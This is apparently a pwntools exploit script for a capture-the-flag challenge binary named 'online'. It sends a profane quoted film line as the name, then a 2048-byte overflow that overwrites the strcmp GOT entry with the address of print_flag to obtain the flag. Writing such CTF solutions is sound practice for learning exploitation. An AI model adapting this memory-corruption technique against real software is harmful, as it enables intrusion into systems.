#!/usr/bin/env python3

from pwn import *

p = process('./online')
#p = remote('challenges.auctf.com', 30013)

p.recvuntil('Name: ')
p.sendline("Fuck you. That's my name. You know why, mister? You drove a Hyundai to get here. I drove an eighty-thousand dollar BMW. THAT'S my name.")
p.recvuntil('menu]: ')
p.sendline('attend Hacker')
p.recvuntil('Welcome!\n')

baseproc = 0x56555000
binary = ELF('online')

payload  = 2048 * b'A'
payload += p32(baseproc + binary.symbols['print_flag'])
payload += p32(baseproc + binary.got['strcmp'])
p.sendline(payload)

p.recvuntil('menu]: ')
p.sendline("give us the flag")
p.stream()
